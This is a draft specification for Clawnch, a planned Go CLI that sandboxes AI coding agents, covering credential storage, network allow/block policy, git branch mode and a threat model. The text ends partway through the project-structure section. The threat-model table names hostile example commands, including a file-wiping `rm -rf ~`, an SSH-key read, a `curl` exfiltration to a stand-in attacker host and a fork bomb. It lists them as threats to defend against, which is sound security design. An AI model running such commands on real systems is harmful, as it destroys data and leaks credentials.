# Clawnch — Software Specification

**Version:** 0.1.0 — Draft  
**License:** Apache 2.0  
**Language:** Go  
**Repository:** `github.com/lucianmocan/clawnch` (planned)

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Problem Statement](#2-problem-statement)
3. [Goals & Non-Goals](#3-goals--non-goals)
4. [Terminology](#4-terminology)
5. [Architecture Overview](#5-architecture-overview)
6. [CLI Specification](#6-cli-specification)
7. [Core Interfaces](#7-core-interfaces)
8. [Backend Subsystem](#8-backend-subsystem)
9. [Credential Subsystem](#9-credential-subsystem)
10. [Agent Registry](#10-agent-registry)
11. [Network Policy](#11-network-policy)
12. [Git Branch Mode](#12-git-branch-mode)
13. [Security Model & Threat Analysis](#13-security-model--threat-analysis)
14. [Configuration](#14-configuration)
15. [Project Structure](#15-project-structure)
16. [Development Workflow](#16-development-workflow)
17. [Testing Strategy](#17-testing-strategy)
18. [Release & Distribution](#18-release--distribution)
19. [Future Work](#19-future-work)
20. [Appendix A — Docker Image Definitions](#20-appendix-a--docker-image-definitions)
21. [Appendix B — Go Module Dependencies](#21-appendix-b--go-module-dependencies)
22. [Appendix C — Error Codes](#22-appendix-c--error-codes)

---

## 1. Executive Summary

Clawnch is an open-source CLI tool that orchestrates secure, isolated environments for AI coding agents. It composes existing sandbox technologies (Docker → microsandbox → Firecracker) with platform-native credential management (macOS Keychain, Linux Secret Service), network policy enforcement, and git workflow automation into a single, extensible command-line interface.

The tool acts as a **sandbox orchestrator** — it does not implement isolation itself. Instead, it selects, configures, and manages the appropriate isolation backend based on the user's requirements, while handling all the peripheral concerns (credentials, network, lifecycle) that make sandboxes practical for daily development.

### Design Philosophy

- **Compose, don't reimplement.** Use the best tool for each layer (Docker for containers, microsandbox for microVMs, system keychain for secrets) and integrate them through a unified interface.
- **Security by default.** Capability dropping, network isolation, no-new-privileges, credential injection via pipes (never disk), and ephemeral sandboxes with automatic cleanup.
- **Platform-native.** Use each OS's built-in secret storage rather than reinvent key management.
- **Pluggable backends.** The same `clawnch run` command works with containers today and microVMs tomorrow, transparently.

---

## 2. Problem Statement

### 2.1 The Agent Safety Problem

AI coding agents (OpenCode, Claude Code, Codex, Gemini CLI, Kiro, etc.) operate by generating and executing arbitrary code — shell commands, file edits, package installations, test suites. This is their fundamental value proposition, but it also makes them inherently dangerous to run directly on a developer's workstation.

An agent or a compromised dependency can:

- **Read** SSH keys, API tokens, browser cookies, `~/.aws/credentials`
- **Modify or delete** files outside the intended project scope
- **Exfiltrate** data to external servers
- **Install** malware, cryptominers, or backdoors
- **Pivot** through the local network to internal services
- **Destroy** git history, overwrite backups, corrupt repositories

### 2.2 Inadequacy of Existing Solutions

| Approach | Problem |
|---|---|
| **Native agent permissions** (Claude Code approvals, Codex sandbox) | Agent can be socially engineered; permissions are enforced by the agent itself, not the system |
| **Running in a container** | Containers share the host kernel; a container escape or kernel exploit breaks isolation |
| **Running in a VM** | Strong isolation but heavyweight; no credential management, no network policy, no git integration |
| **`docker sandbox` / `sbx`** | Proprietary, not open source, tied to Docker's ecosystem, limited agent support |
| **microsandbox** | Excellent microVM isolation but low-level; no CLI for non-Rust developers, no credential or network integration |
| **yolobox / yolo-cage / landrun** | Each solves one piece (containers, QEMU, Landlock), none provides a comprehensive solution |

### 2.3 The Gap

No open-source tool exists that:

1. Provides a **unified CLI** for running any coding agent safely
2. Supports **multiple isolation backends** (containers for speed, microVMs for strong isolation)
3. Integrates **platform-native credential management** (no plaintext `.env` files)
4. Enforces **network policies** (default-isolate, allow-list specific hosts)
5. Manages **sandbox lifecycle** (run, list, stop, logs, cleanup)
6. Offers **git workflow automation** (auto-branch, auto-PR)

Clawnch fills this gap.

---

## 3. Goals & Non-Goals

### 3.1 Goals

- **Secure by default.** A sandbox should be more restricted than the host, not less. Defaults must favor safety over convenience.
- **Cross-platform.** macOS (Apple Silicon + Intel) for MVP; Linux (amd64 + arm64) in scope; Windows (future).
- **Multi-agent.** Support OpenCode, Claude Code, Codex, Gemini CLI, and Kiro out of the box, with a documented extension path for custom agents.
- **Pluggable backends.** Container isolation (Docker) for MVP; microVM isolation (microsandbox / Firecracker) as a future backend.
- **Platform-native secrets.** macOS Keychain for Apple systems; freedesktop.org Secret Service / `secret-tool` for Linux; encrypted file fallback for headless environments.
- **Network policy.** Configurable allow/block lists for outbound traffic from sandboxes.
- **Lifecycle management.** Commands to list, inspect, stop, and retrieve logs from running sandboxes.
- **Single static binary.** No runtime dependency beyond the system's existing Docker or microsandbox installation.

### 3.2 Non-Goals

- **Not a container runtime.** Clawnch will not implement its own container isolation. It delegates to Docker, microsandbox, or similar.
- **Not a secrets manager.** Clawnch does not replace 1Password, Bitwarden, or Vault. It reads from the system keychain and injects credentials into the sandbox as environment variables.
- **Not a CI/CD platform.** Clawnch targets interactive developer workflows, not production pipeline execution.
- **Not an agent framework.** Clawnch does not implement agent logic, tool calling, or model interaction. It provides the environment where agents run.
- **Not a network proxy.** Network policy is enforced at the container/VM level (iptables, Docker network drivers), not via an application-level proxy.
- **No GUI.** The interface is a terminal CLI and (future) TUI. No web UI or desktop app.

---

## 4. Terminology

| Term | Definition |
|---|---|
| **Sandbox** | An isolated execution environment (container or microVM) created and managed by clawnch |
| **Agent** | An AI coding agent CLI tool installed inside the sandbox image (e.g., opencode, claude) |
| **Backend** | A concrete isolation technology that implements the `Backend` interface (e.g., Docker, microsandbox) |
| **CredStore** | A credential storage backend that implements the `CredStore` interface (e.g., macOS Keychain, encrypted file) |
| **Workspace** | The host directory mounted into the sandbox for the agent to operate on |
| **Network Policy** | A set of rules controlling outbound network access from the sandbox |
| **Branch Mode** | A feature that auto-creates a git branch before a session and optionally commits/PRs after |

---

## 5. Architecture Overview

### 5.1 High-Level Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    User (terminal)                        │
└─────────────────────┬───────────────────────────────────┘
                      │ clawnch run opencode ./project
                      ▼
┌─────────────────────────────────────────────────────────┐
│                      clawnch CLI                        │
│  ┌─────────────┐  ┌──────────┐  ┌────────┐  ┌───────┐  │
│  │  subcommand  │  │  config  │  │  error  │  │  log  │  │
│  │   dispatch   │  │  loader  │  │ handler │  │       │  │
│  └──────┬───────┘  └──────────┘  └────────┘  └───────┘  │
└─────────┼───────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────┐
│                   Orchestration Layer                    │
│  1. Resolve workspace path                              │
│  2. Resolve agent (image, command, required env vars)    │
│  3. Build / pull agent image if missing                  │
│  4. Retrieve credentials via CredStore                   │
│  5. Build --env-file from retrieved credentials          │
│  6. Resolve network policy from config                   │
│  7. (Optional) Create git branch                         │
│  8. Call Backend.Run()                                   │
│  9. Clean up temp files on exit                          │
└─────────────────────────────────────────────────────────┘
          │
          ├──────────────────┬──────────────────┐
          ▼                  ▼                  ▼
┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐
│  Backend        │  │  CredStore       │  │  Network Policy │
│  (interface)    │  │  (interface)     │  │                 │
├─────────────────┤  ├─────────────────┤  ├─────────────────┤
│ ContainerBackend│  │ KeychainCredStore│  │  config.toml    │
│ MicrovmBackend  │  │ EncFileCredStore │  │  Docker flags   │
│ (future)        │  │ SecretService   │  │  iptables (fut.)│
│                 │  │ (future)        │  │                 │
└────────┬────────┘  └────────┬────────┘  └─────────────────┘
         │                    │
         ▼                    ▼
   ┌──────────┐        ┌──────────────┐
   │  docker  │        │  security /  │
   │  micro-  │        │  openssl /   │
   │  sandbox │        │  secret-tool │
   └──────────┘        └──────────────┘
```

### 5.2 Lifecycle of a `clawnch run` Command

```
Phase 1 — Validation
  ├── Parse CLI flags & arguments
  ├── Verify agent name is known
  ├── Resolve workspace path (absolute, ~-expanded, verified exists)
  └── Validate backend name

Phase 2 — Credential Retrieval
  ├── Determine required env vars from agent metadata
  ├── For each var: credStore.Get(key)
  ├── If any required key is missing: warn user (continue? / abort?)
  └── Write decrypted credentials to a temp file (mktemp, 0600)

Phase 3 — Image Resolution
  ├── Check if image exists: docker image inspect clawnch/<agent>
  ├── If not found: build from images/<agent>.Dockerfile
  └── (Future: pull from a registry)

Phase 4 — Network Policy
  ├── Load network config from ~/.config/clawnch/network.toml
  ├── Determine effective mode (flag > config > default)
  └── Build Docker network flags (--network, --add-host, --cap-drop)

Phase 5 — Git Branch (optional)
  ├── Verify workspace is a git repository
  ├── Create branch: clawnch/<agent>-<timestamp>
  └── (Future: configure branch naming template)

Phase 6 — Execution
  ├── Build docker run command with all flags
  ├── Execute with stdin/stdout/stderr attached
  ├── (If --detach: print sandbox name and return immediately)
  └── (If interactive: wait for process to exit)

Phase 7 — Cleanup
  ├── Remove temp env file (defer via trap)
  ├── (If branch mode: print merge instructions or auto-merge)
  └── Print summary
```

### 5.3 Process Model

Clawnch runs as a single process. It does not run a daemon. Sandbox lifecycle commands (`list`, `stop`, `logs`) inspect Docker containers directly rather than maintaining internal state.

This keeps the tool stateless and simple. The only persistent state is:

| Data | Location | Format |
|---|---|---|
| Credentials | System keychain (macOS: `security`, Linux: `secret-tool`) | Platform-native |
| Network policy | `~/.config/clawnch/network.toml` | TOML |
| User preferences | `~/.config/clawnch/config.toml` | TOML |
| Agent images | Docker local image store | Docker images |

There is no Clawnch-specific daemon, database, or lock file.

---

## 6. CLI Specification

### 6.1 Global Flags

| Flag | Default | Description |
|---|---|---|
| `--config` | `~/.config/clawnch/config.toml` | Path to config file |
| `--log-level` | `warn` | Log level: `debug`, `info`, `warn`, `error` |
| `--log-format` | `text` | Output format: `text`, `json` |
| `--no-color` | `false` | Disable ANSI color output |

### 6.2 Commands

#### 6.2.1 `clawnch run <agent> [directory]`

Run an AI agent inside a sandbox.

**Arguments:**

| Arg | Required | Description |
|---|---|---|
| `agent` | Yes | Name of the agent to run (see `clawnch agents`) |
| `directory` | No | Project directory (default: current directory) |

**Flags:**

| Flag | Default | Description |
|---|---|---|
| `--backend` | `container` | Isolation backend: `container`, `microvm` (future) |
| `--name` | auto-generated | Assign a name to the sandbox for later reference |
| `--network` | `isolated` | Network mode: `isolated`, `host`, `none` |
| `--branch` | `false` | Auto-create a git branch for this session |
| `--no-creds` | `false` | Skip credential injection (e.g., for free/open models) |
| `-d`, `--detach` | `false` | Run in background, print sandbox name |

**Network modes:**

| Mode | Behavior |
|---|---|
| `isolated` | Default bridge network. User's allow/block rules are applied via `--add-host` |
| `host` | Host network stack. No isolation. Explicit user opt-in required. |
| `none` | No network. Loopback only. Agent cannot reach any external service. |

**Exit codes:**

| Code | Meaning |
|---|---|
| 0 | Agent exited successfully |
| 1 | General error (invalid args, backend unavailable, etc.) |
| 2 | Agent exited with error |
| 3 | Interrupted by user (SIGINT) |

**Examples:**

```sh
# Run opencode in current directory, auto-creds, isolated network
clawnch run opencode

# Run opencode against a specific project
clawnch run opencode ~/projects/my-app

# Run Claude Code with a custom name and detached
clawnch run claude . --name my-experiment --detach

# Run with no network access at all
clawnch run opencode . --network none

# Run with git branch auto-creation
clawnch run opencode . --branch

# Run with the microVM backend (future)
clawnch run opencode . --backend microvm

# Skip credential injection (use built-in free models)
clawnch run opencode . --no-creds
```

#### 6.2.2 `clawnch setup`

Interactively store API keys in the system keychain.

The command iterates through known environment variable names (from the agent registry), prompts for each value, and stores them via the configured `CredStore`.

**Flags:**

| Flag | Default | Description |
|---|---|---|
| `--store` | auto | Credential backend: `keychain`, `file` |

**Examples:**

```sh
# Interactive setup (prompts for each known key)
clawnch setup

# Store a single key non-interactively
echo "sk-or-v1-..." | clawnch setup --key OPENROUTER_API_KEY
```

#### 6.2.3 `clawnch list`

List running sandboxes.

**Flags:**

| Flag | Default | Description |
|---|---|---|
| `--all` | `false` | Include stopped sandboxes |
| `--agent` | `""` | Filter by agent name |
| `--quiet` | `false` | Print only sandbox names (one per line) |

**Output columns:**

| Column | Description |
|---|---|
| `NAME` | Sandbox name (or auto-generated ID) |
| `AGENT` | Agent type |
| `BACKEND` | Isolation backend |
| `WORKSPACE` | Mounted host directory |
| `STATUS` | `running`, `exited`, `created` |
| `CREATED` | When the sandbox was created |
| `NETWORK` | Network policy mode |

**Examples:**

```sh
# List all running sandboxes
clawnch list

# List all sandboxes (including stopped)
clawnch list --all

# Filter by agent
clawnch list --agent claude

# Machine-readable output
clawnch list --quiet
```

#### 6.2.4 `clawnch stop <name>`

Stop and remove a running sandbox.

**Arguments:**

| Arg | Required | Description |
|---|---|---|
| `name` | Yes | Sandbox name or container ID |

**Flags:**

| Flag | Default | Description |
|---|---|---|
| `--rm` | `true` | Also remove the container after stopping |
| `--force` | `false` | Force stop (SIGKILL instead of SIGTERM) |

**Examples:**

```sh
clawnch stop my-experiment
clawnch stop my-experiment --force
```

#### 6.2.5 `clawnch logs <name>`

Display logs from a sandbox.

**Arguments:**

| Arg | Required | Description |
|---|---|---|
| `name` | Yes | Sandbox name or container ID |

**Flags:**

| Flag | Default | Description |
|---|---|---|
| `-f`, `--follow` | `false` | Follow log output (tail -f) |
| `--tail` | `50` | Number of lines to show from the end |
| `--timestamps` | `false` | Show timestamps |

#### 6.2.6 `clawnch network`

Manage network allow/block rules.

**Subcommands:**

| Subcommand | Description |
|---|---|
| `clawnch network allow <host>...` | Add hosts to the allow list |
| `clawnch network block <host>...` | Add hosts to the block list |
| `clawnch network list` | Show current rules |
| `clawnch network reset` | Clear all rules |

**Examples:**

```sh
# Allow AI provider endpoints
clawnch network allow api.openai.com api.anthropic.com openrouter.ai

# Block known telemetry or unwanted hosts
clawnch network block telemetry.example.com

# Show current rules
clawnch network list
```

**How it works:**

In `isolated` network mode, the container runs on a user-defined Docker bridge network. Allowed hosts are resolved to IPs and added via `--add-host` entries. Blocked hosts are resolved to `0.0.0.0`. All other traffic is dropped by default (Docker bridge default policy).

In `none` mode, no network rules are applied (the container has no network at all).

#### 6.2.7 `clawnch agents`

List available agents and their details.

**Subcommands:**

| Subcommand | Description |
|---|---|
| `clawnch agents` | List all available agents |
| `clawnch agents info <name>` | Show detailed information about an agent |

**Agent info fields:**

| Field | Description |
|---|---|
| `Name` | Agent identifier |
| `Description` | Human-readable description |
| `Image` | Docker image name |
| `Backends` | Supported isolation backends |
| `Required Env` | Required environment variables |
| `Command` | Entrypoint command inside the sandbox |

#### 6.2.8 `clawnch version`

Print version information.

```
clawnch version 0.1.0
Commit: a1b2c3d4e5f6
Date: 2026-06-02T14:00:00Z
```

#### 6.2.9 `clawnch help [command]`

Display help for a command or subcommand.

---

## 7. Core Interfaces

### 7.1 Backend Interface

```go
// Backend is the isolation boundary. Implementations translate the generic
// SandboxConfig into concrete commands for a specific runtime (Docker,
// microsandbox, etc.).
type Backend interface {
    // Run creates and starts a sandbox. For interactive sessions it blocks
    // until the sandbox exits. For detached sessions it returns immediately
    // with the sandbox identifier.
    Run(ctx context.Context, cfg SandboxConfig) (*Sandbox, error)

    // List returns all sandboxes managed by this backend, optionally
    // including stopped ones.
    List(ctx context.Context, all bool) ([]Sandbox, error)

    // Stop terminates a sandbox by name or ID, with optional force kill.
    Stop(ctx context.Context, name string, force bool) error

    // Logs retrieves the log output from a sandbox.
    Logs(ctx context.Context, name string, opts LogOptions) ([]byte, error)

    // Available reports whether this backend is usable on the current system.
    Available(ctx context.Context) error
}

type SandboxConfig struct {
    Name      string
    Workspace string            // Absolute path to project
    Agent     Agent
    Network   NetworkMode        // isolated | host | none
    AllowList []string           // Hosts allowed through
    BlockList []string           // Hosts blocked
    EnvFile   string            // Path to temp env file
    Detach    bool
    Branch    string            // Git branch name (empty = no branch)
    Backend   string            // Backend identifier
}

type Sandbox struct {
    Name      string            `json:"name"`
    Agent     string            `json:"agent"`
    Backend   string            `json:"backend"`
    Workspace string            `json:"workspace"`
    Status    string            `json:"status"`
    Created   time.Time         `json:"created"`
    Network   string            `json:"network"`
    ID        string            `json:"id"`       // Backend-specific identifier
}

type LogOptions struct {
    Follow     bool
    Tail       int
    Timestamps bool
}

type NetworkMode string

const (
    NetworkIsolated NetworkMode = "isolated"
    NetworkHost     NetworkMode = "host"
    NetworkNone     NetworkMode = "none"
)
```

### 7.2 CredStore Interface

```go
// CredStore manages API key storage and retrieval. Implementations map to
// platform-native secret storage (macOS Keychain, Linux Secret Service, etc.)
// or provide a cross-platform encrypted file fallback.
type CredStore interface {
    // Get retrieves a credential value by key name.
    Get(key string) (string, error)

    // Set stores a credential value. It must overwrite any existing value
    // for the same key.
    Set(key, value string) error

    // Delete removes a credential by key name.
    Delete(key string) error

    // List returns all stored credential key names.
    List() ([]string, error)

    // Available reports whether this credential store is usable on the
    // current system.
    Available(ctx context.Context) error
}

// Credential keys that clawnch recognizes. Each agent declares which keys
// it requires via Agent.EnvKeys.
const (
    EnvOpenRouter     = "OPENROUTER_API_KEY"
    EnvAnthropic      = "ANTHROPIC_API_KEY"
    EnvOpenAI         = "OPENAI_API_KEY"
    EnvGoogle         = "GOOGLE_API_KEY"
    EnvDeepSeek       = "DEEPSEEK_API_KEY"
    EnvTogether       = "TOGETHER_API_KEY"
    EnvGitHubToken    = "GITHUB_TOKEN"
)
```

### 7.3 Agent Definition

```go
// Agent describes an AI coding agent that clawnch can sandbox.
type Agent struct {
    // Name is the CLI identifier (e.g., "opencode", "claude").
    Name string

    // Description is a human-readable summary.
    Description string

    // Image is the Docker image tag (e.g., "clawnch/opencode").
    Image string

    // BuildFile is the path to the Dockerfile relative to the images/
    // directory in the clawnch project.
    BuildFile string

    // Command is the entrypoint executed inside the sandbox.
    Command []string

    // EnvKeys lists the environment variable names this agent can use.
    // Keys are injected from the CredStore on startup.
    EnvKeys []string

    // SupportedBackends lists which Backend implementations this agent
    // image supports (e.g., "container", "microvm").
    SupportedBackends []string
}

// AgentRegistry returns all built-in agent definitions.
func AgentRegistry() []Agent {
    return []Agent{
        {
            Name:              "opencode",
            Description:       "Open-source AI coding agent for the terminal",
            Image:             "clawnch/opencode",
            BuildFile:         "images/opencode.Dockerfile",
            Command:           []string{"opencode", "/workspace"},
            EnvKeys:           []string{EnvOpenRouter, EnvAnthropic, EnvOpenAI, EnvGoogle, EnvDeepSeek},
            SupportedBackends: []string{"container"},
        },
        {
            Name:              "claude",
            Description:       "Anthropic's Claude Code CLI agent",
            Image:             "clawnch/claude",
            BuildFile:         "images/claude.Dockerfile",
            Command:           []string{"claude", "/workspace"},
            EnvKeys:           []string{EnvAnthropic},
            SupportedBackends: []string{"container"},
        },
        {
            Name:              "codex",
            Description:       "OpenAI Codex CLI agent",
            Image:             "clawnch/codex",
            BuildFile:         "images/codex.Dockerfile",
            Command:           []string{"codex", "/workspace"},
            EnvKeys:           []string{EnvOpenAI},
            SupportedBackends: []string{"container"},
        },
    }
}
```

---

## 8. Backend Subsystem

### 8.1 ContainerBackend (MVP)

The `ContainerBackend` shells out to the local `docker` CLI. It is the default and primary backend for the MVP.

**Responsibilities:**
- Translate `SandboxConfig` into a `docker run` invocation
- Manage sandbox lifecycle via `docker ps`, `docker stop`, `docker logs`
- Verify Docker availability via `docker info`

**Docker flags generated by `ContainerBackend.Run`:**

```sh
docker run -it --rm \
    --name <sandbox-name> \
    -v <workspace>:/workspace:delegated \
    --env-file <temp-env-file> \
    --network <network-config> \
    --add-host <allowed-hosts...> \
    --cap-drop ALL \
    --security-opt no-new-privileges:true \
    --label clawnch=true \
    --label clawnch.agent=<agent> \
    --label clawnch.backend=container \
    <image> \
    <command...>
```

**Container naming:**
- If the user provides `--name`, use it directly (validate: alphanumeric, hyphens, underscores only)
- If not provided: `<agent>-<random-suffix>` (e.g., `opencode-a7x3k`)

**Labeling:**
All sandbox containers are labeled with `clawnch=true` so `clawnch list` can filter reliably via `docker ps --filter label=clawnch=true`.

**Docker requirement:**
- Docker Engine or Docker Desktop must be installed and the daemon accessible via the default socket (`/var/run/docker.sock` on Linux, `~/.docker/run/docker.sock` on macOS)

### 8.2 MicrovmBackend (Future)

The `MicrovmBackend` will shell out to `microsandbox` (or similar microVM runtime). It is not in scope for the MVP but the interface is designed to support it.

**Key differences from ContainerBackend:**
- MicroVMs run a separate kernel — stronger isolation guarantees
- Cold start is slower (2–5 seconds vs <1s for containers)
- Docker-in-Docker support: agent can run Docker commands inside the microVM
- Currently Linux-only (KVM required); macOS via virtualization framework is future work

---

## 9. Credential Subsystem

### 9.1 KeychainCredStore (macOS, MVP)

**Implementation:** Shells out to the `security` CLI.

```go
func (k *KeychainCredStore) Get(key string) (string, error) {
    // security find-generic-password -s clawnch -a <key> -w
    cmd := exec.Command("security", "find-generic-password",
        "-s", "clawnch",
        "-a", key,
        "-w")
    out, err := cmd.Output()
    if err != nil {
        return "", ErrCredNotFound{Key: key}
    }
    return strings.TrimSpace(string(out)), nil
}
```

**Service name:** `clawnch` (all credential entries use this service name)

**Access control:** Entries are created with `-A` (allow all applications to access without prompting) to avoid repeated dialog boxes during CLI use.

**Security properties:**
- Keychain data is encrypted at rest with the user's login password
- On Apple Silicon, keychain encryption uses the Secure Enclave
- Credentials are never written to disk as plaintext by clawnch

### 9.2 EncFileCredStore (Cross-Platform Fallback, MVP)

**Implementation:** Uses `openssl enc -aes-256-cbc -pbkdf2 -iter 600000` to encrypt/decrypt a file.

```go
type EncFileCredStore struct {
    path string  // e.g., ~/.config/clawnch/creds.enc
}
```

**Encryption details:**
- Algorithm: AES-256-CBC
- KDF: PBKDF2 with 600,000 iterations
- File format: OpenSSL's salted format (compatible with `openssl enc -d`)
- Password: derived from a user-chosen master password (prompted on first use)

**Usage:**
- Primarily for Linux systems without a running Secret Service daemon
- Also useful for CI/headless environments
- The master password is prompted once per session and cached in memory (not written to disk)

### 9.3 SecretServiceCredStore (Linux, Future)

**Implementation:** Shells out to `secret-tool` (libsecret).

```go
// secret-tool store --label='clawnch' service clawnch key <key>
// secret-tool lookup service clawnch key <key>
```

**Dependency:** `libsecret` (via `secret-tool` CLI, typically packaged as `libsecret-tools` on Debian/Ubuntu, `secret-tool` on Fedora/Arch).

### 9.4 Credential Flow

```
                    clawnch run opencode
                           │
                           ▼
              ┌─────────────────────────┐
              │ Agent.EnvKeys =          │
              │ [OPENROUTER_API_KEY,     │
              │  ANTHROPIC_API_KEY]      │
              └──────────┬──────────────┘
                         │
                         ▼
              For each key, credStore.Get(key)
                         │
                         ├── Found all? ──► Write to temp env file
                         │                     (mktemp, 0600)
                         │
                         └── Missing any? ──► Warn user
                                               ┌── Continue (missing keys ignored)
                                               └── Abort
```

### 9.5 Temp File Security

The temp env file is:
- Created with `mktemp` (non-deterministic name, world-readable directory)
- Permission set to `0600` (owner read/write only)
- Registered with `defer os.Remove(file)` and signal trap (SIGINT, SIGTERM)
- Never written to disk on the host when using process substitution (`<()`)

The current Justfile implementation uses bash process substitution (`--env-file <( ... )`), which avoids the temp file entirely by connecting a pipe directly to the subprocess. The Go implementation should replicate this pattern where possible by using a pipe for credential injection.

---

## 10. Agent Registry

### 10.1 Built-in Agents

| Agent | Image | Command | Required Env | Backends |
|---|---|---|---|---|
| `opencode` | `clawnch/opencode` | `opencode /workspace` | `OPENROUTER_API_KEY`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY` | container |
| `claude` | `clawnch/claude` | `claude /workspace` | `ANTHROPIC_API_KEY` | container |
| `codex` | `clawnch/codex` | `codex /workspace` | `OPENAI_API_KEY` | container |

### 10.2 Agent Image Build Process

When an agent image is not found locally, clawnch builds it using the Dockerfile in `images/<agent>.Dockerfile`:

```
docker build -f images/<agent>.Dockerfile -t clawnch/<agent> .
```

**Build context is the project root** (not the image directory) so that Dockerfiles can reference shared assets if needed.

### 10.3 User-Defined Agents (Future)

Users will be able to define custom agents via `~/.config/clawnch/agents.toml`:

```toml
[agents.my-agent]
description = "My Custom Agent"
image = "my-custom-image:latest"
command = ["my-agent", "/workspace"]
env_keys = ["MY_API_KEY"]
backends = ["container"]
```

---

## 11. Network Policy

### 11.1 Policy Model

The network policy answers: "What external hosts can the agent inside the sandbox reach?"

**Policy rules:**
- **Allow list:** Hosts the sandbox is permitted to connect to (e.g., AI API endpoints)
- **Block list:** Hosts explicitly denied (e.g., internal services, telemetry endpoints)
- **Default action:** Depends on the network mode

**Network modes:**

| Mode | Default | Allow list | Block list | Use case |
|---|---|---|---|---|
| `isolated` (default) | Drop all outbound except loopback | Resolved to IPs, passed via `--add-host` | Resolved to `0.0.0.0` | General use |
| `host` | No restriction (host network) | Ignored | Ignored | Debugging / legacy tools |
| `none` | No network at all | Ignored | Ignored | Maximum isolation |

### 11.2 Implementation (ContainerBackend)

**Isolated mode:**
The container runs on a user-defined Docker bridge network (`clawnch` bridge, created automatically on first use). DNS resolution is handled by Docker's embedded DNS.

- Allowed hosts: `--add-host <hostname>:<resolved-ip>` (resolved at sandbox start time)
- Blocked hosts: `--add-host <hostname>:0.0.0.0`
- No `--add-host` entries for hosts not in allow/block lists → default Docker DNS

**Host mode:**
`--network host` — container shares the host's network stack. No isolation.

**None mode:**
`--network none` — container has loopback only.

### 11.3 Config File Format

Location: `~/.config/clawnch/network.toml`

```toml
# Hosts the sandbox is allowed to reach (resolved at sandbox start)
allow = [
    "api.openai.com",
    "api.anthropic.com",
    "openrouter.ai",
    "api.deepseek.com",
    "generativelanguage.googleapis.com",
    "api.together.xyz",
    "registry.npmjs.org",
    "github.com",
]

# Hosts the sandbox is explicitly blocked from reaching
block = [
    "169.254.169.254",  # cloud metadata endpoint
]
```

### 11.4 DNS Resolution and Caching

Allowed and blocked hosts are resolved to IP addresses at sandbox start time. Results are cached for the lifetime of the process to avoid repeated DNS lookups for the same hostname. If DNS resolution fails for a host, a warning is printed and the hostname is passed to Docker as-is (Docker's embedded DNS will resolve it at container runtime).

---

## 12. Git Branch Mode

### 12.1 Motivation

When an AI agent modifies files in the workspace, changes are applied directly to the working tree. If the changes are unsatisfactory or destructive, recovering requires manual `git checkout` or `git restore`.

Branch mode creates a dedicated git branch before the sandbox session, isolating the agent's changes from the main branch.

### 12.2 Flow

```
1. Verify workspace is a git repository
2. Verify no uncommitted changes (stash or abort)
3. git checkout -b clawnch/<agent>/<timestamp>
4. Run the sandbox (agent modifies files on the branch)
5. After exit:
   - Print instructions to review and merge
   - Option to auto-stage and commit
   - Option to auto-create a PR (GitHub CLI integration)
```

### 12.3 Branch Naming Convention

```
clawnch/<agent>/<YYYYMMDD>-<HHMMSS>
```

Example: `clawnch/opencode/20260602-143000`

### 12.4 Flags

| Flag | Behavior |
|---|---|
| `--branch` | Create a branch, print merge instructions on exit |
| `--branch --commit` | Auto-stage all changes and commit with a generated message |
| `--branch --pr` | Create a GitHub PR (requires `gh` CLI) |

---

## 13. Security Model & Threat Analysis

### 13.1 Threat Model

Clawnch assumes the AI agent (or code it executes) is **untrusted and potentially malicious**. The threat model includes:

| Threat | Example | Mitigation |
|---|---|---|
| Filesystem access | `rm -rf ~`, `cat ~/.ssh/id_rsa` | Container mounts only the workspace. No access to `/home`, `/etc`, or other host paths. |
| Credential exfiltration | `curl -d @/etc/environment attacker.com` | Credentials injected as env vars only. No keychain or config files inside the container. |
| Network pivot | `ssh internal-server` | Default-isolated network. Only allow-listed hosts reachable. |
| Docker escape | Mount `/var/run/docker.sock` | The Docker socket is never mounted into the container. |
| Resource exhaustion | `:(){ :\|:& };:` | Container resource limits (future: `--memory`, `--cpus` flags). |
| Supply chain | Malicious npm/pip package downloads | Read-only filesystem for system paths (future: `--read-only`). |

### 13.2 Defense Layers

```
Layer 1 — CLI Guardrails
  ├── Validate workspace path (reject /, /etc, /home, ~/.ssh, etc.)
  ├── Reject known-dangerous mounts
  └── Warn if running as root

Layer 2 — Container Isolation
  ├── --cap-drop ALL (no Linux capabilities)
  ├── --security-opt no-new-privileges:true
  ├── --network isolated (default)
  ├── Read-only root filesystem (future)
  └── No --privileged, no --device, no --pid=host

Layer 3 — Credential Protection
  ├── Keys injected via pipes or temp files (0600, auto-deleted)
  ├── No keychain access from inside the container
  └── No host config files mounted

Layer 4 — Network Controls
  ├── Default-deny outbound traffic
  ├── Allow-list only for known endpoints
  └── Cloud metadata endpoint blocked by default

Layer 5 — MicroVM (future)
  ├── Separate kernel — container escape ≠ host compromise
  └── Hypervisor-enforced memory isolation
```

### 13.3 Assumptions & Trust Boundaries

- **Docker is trusted.** Clawnch assumes the Docker daemon is correctly installed, configured, and not compromised. A compromised Docker daemon can bypass all container-level isolation.
- **The system keychain is trusted.** Clawnch assumes the OS keychain has not been tampered with.
- **The agent image is trusted.** Clawnch builds images from pinned base images with checksum verification. In the future, image signing will be supported.
- **The host kernel is trusted.** Container isolation relies on the host kernel's namespace implementation. A kernel vulnerability can bypass container isolation. MicroVM backend mitigates this.

### 13.4 Security-Sensitive Operations

The following operations require explicit user confirmation (future: `--dangerously-skip-permissions` flag to suppress):

- Running in `--network host` mode
- Mounting additional host directories
- Running as root inside the sandbox
- Disabling `--cap-drop ALL`
- Using `--no-creds` with an agent that requires credentials

---

## 14. Configuration

### 14.1 Config File Locations

| Path | Purpose | Format |
|---|---|---|
| `~/.config/clawnch/config.toml` | User preferences | TOML |
| `~/.config/clawnch/network.toml` | Network allow/block rules | TOML |
| `~/.local/share/clawnch/` | Runtime data (future) | — |

### 14.2 User Config (`config.toml`)

```toml
# Default isolation backend
default_backend = "container"  # "container" | "microvm"

# Default network mode
default_network = "isolated"  # "isolated" | "host" | "none"

# Default credential store
default_cred_store = "auto"   # "auto" | "keychain" | "file"

# Encrypted file options (used when cred_store = "file")
[cred_file]
path = "~/.config/clawnch/creds.enc"

# Git branch mode defaults
[branch]
auto_commit = false
auto_pr = false
prefix = "clawnch"
```

### 14.3 Config Precedence

1. CLI flags (highest)
2. `--config` file (if specified)
3. `~/.config/clawnch/config.toml`
4. Built-in defaults (lowest)

---

## 15. Project Structure

```
clawnch/
├── main.go                       # Entrypoint
├── go.mod
├── go.sum
├── Justfile                      # Build, test, release
